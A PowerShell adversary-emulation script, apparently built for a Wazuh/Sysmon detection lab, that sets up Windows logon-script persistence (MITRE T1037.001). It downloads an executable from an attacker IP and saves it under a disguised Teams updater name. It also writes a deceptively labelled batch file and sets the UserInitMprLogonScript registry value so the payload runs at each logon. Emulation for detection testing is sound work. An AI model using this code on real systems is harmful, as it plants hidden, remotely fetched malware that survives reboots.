# =============================================================================
# persist_03_logon.ps1 -- Logon Script Persistence
# MITRE ATT&CK: T1037.001 - Boot or Logon Initialization Scripts: Logon Script (Windows)
# =============================================================================
# Wazuh Detection:
#   - Sysmon EID 13 (RegistryEvent - Value Set)
#     TargetObject: HKCU\Environment\UserInitMprLogonScript
#   - Sysmon EID 11 (FileCreate) when .bat file is created
#   - Wazuh Rule ID: 61603 (Sysmon registry modification - HKCU\Environment)
# =============================================================================

param(
    [ValidateSet("install","test","remove")]
    [string]$Action = "install"
)

# ==============================================================================
# CONFIG
# ==============================================================================
$ATTACKER_IP  = "192.168.247.139"
$PAYLOAD_URL  = "http://${ATTACKER_IP}:9090/loader_garble.exe"
$PAYLOAD_PATH = "$env:LOCALAPPDATA\Microsoft\Teams\TeamsUpdater.exe"

$BAT_PATH  = "$env:TEMP\WinSvcHelper.bat"
$REG_PATH  = "HKCU:\Environment"
$REG_NAME  = "UserInitMprLogonScript"
# ==============================================================================

function Download-Payload {
    if (-not (Test-Path $PAYLOAD_PATH)) {
        Write-Host "[*] Downloading payload from $PAYLOAD_URL ..." -ForegroundColor Yellow
        try {
            Invoke-WebRequest -Uri $PAYLOAD_URL -OutFile $PAYLOAD_PATH -UseBasicParsing -ErrorAction Stop
            Write-Host "[+] Payload saved to: $PAYLOAD_PATH" -ForegroundColor Green
        } catch {
            Write-Warning "[!] Download failed. Creating dummy payload for testing..."
            [System.IO.File]::WriteAllText($PAYLOAD_PATH, "REM dummy payload")
        }
    } else {
        Write-Host "[*] Payload already exists at: $PAYLOAD_PATH" -ForegroundColor Cyan
    }
}

function Install-Persistence {
    Write-Host "`n[*] Installing Logon Script persistence..." -ForegroundColor Cyan
    Download-Payload

    try {
        # Create .bat file that runs payload -- Sysmon EID 11 triggers here
        $batContent = @"
@echo off
REM Windows Management Helper - do not delete
start /B "" "$PAYLOAD_PATH"
"@
        Set-Content -Path $BAT_PATH -Value $batContent -Encoding ASCII
        Write-Host "[+] Logon script created: $BAT_PATH" -ForegroundColor Green

        # Write registry key -- Sysmon EID 13 triggers here
        if (-not (Test-Path $REG_PATH)) {
            New-Item -Path $REG_PATH -Force | Out-Null
        }
        Set-ItemProperty -Path $REG_PATH -Name $REG_NAME -Value $BAT_PATH -Type String -Force
        Write-Host "[+] Registry key set:" -ForegroundColor Green
        Write-Host "    Path : $REG_PATH" -ForegroundColor Gray
        Write-Host "    Name : $REG_NAME" -ForegroundColor Gray
        Write-Host "    Value: $BAT_PATH" -ForegroundColor Gray
        Write-Host "[+] Persistence installed. Script will run on next logon." -ForegroundColor Green
        return $true
    } catch {
        Write-Error "[!] Failed to install persistence: $_"
        return $false
    }
}

function Test-Persistence {
    Write-Host "`n[*] Verifying Logon Script persistence..." -ForegroundColor Cyan
    $ok = $true

    try {
        $val = Get-ItemPropertyValue -Path $REG_PATH -Name $REG_NAME -ErrorAction Stop
        Write-Host "[+] Registry key FOUND: $REG_NAME = $val" -ForegroundColor Green
    } catch {
        Write-Host "[-] Registry key NOT found: $REG_NAME" -ForegroundColor Red
        $ok = $false
    }

    if (Test-Path $BAT_PATH) {
        Write-Host "[+] Logon script EXISTS: $BAT_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Logon script MISSING: $BAT_PATH" -ForegroundColor Red
        $ok = $false
    }

    if (Test-Path $PAYLOAD_PATH) {
        Write-Host "[+] Payload file EXISTS: $PAYLOAD_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Payload file MISSING: $PAYLOAD_PATH" -ForegroundColor Red
        $ok = $false
    }

    if ($ok) { Write-Host "[RESULT] Persistence ACTIVE v" -ForegroundColor Green }
    else      { Write-Host "[RESULT] Persistence INCOMPLETE x" -ForegroundColor Red }
    return $ok
}

function Remove-Persistence {
    Write-Host "`n[*] Removing Logon Script persistence..." -ForegroundColor Cyan
    try {
        Remove-ItemProperty -Path $REG_PATH -Name $REG_NAME -ErrorAction Stop
        Write-Host "[+] Registry key removed: $REG_NAME" -ForegroundColor Green
    } catch {
        Write-Host "[-] Registry key not found (already removed?)" -ForegroundColor Yellow
    }
    foreach ($f in @($BAT_PATH, $PAYLOAD_PATH)) {
        if (Test-Path $f) {
            Remove-Item -Path $f -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Removed: $f" -ForegroundColor Green
        } else {
            Write-Host "[-] Not found (already removed?): $f" -ForegroundColor Yellow
        }
    }
    Write-Host "[+] Cleanup complete." -ForegroundColor Green
}

# ==============================================================================
# Main Logic
# ==============================================================================
Write-Host "============================================================" -ForegroundColor Magenta
Write-Host " persist_03_logon.ps1 -- T1037.001 Logon Script" -ForegroundColor Magenta
Write-Host " Wazuh: Sysmon EID 13 (HKCU\Environment\UserInitMprLogonScript)" -ForegroundColor Magenta
Write-Host "============================================================" -ForegroundColor Magenta

switch ($Action) {
    "install" { Install-Persistence }
    "test"    { Test-Persistence }
    "remove"  { Remove-Persistence }
}
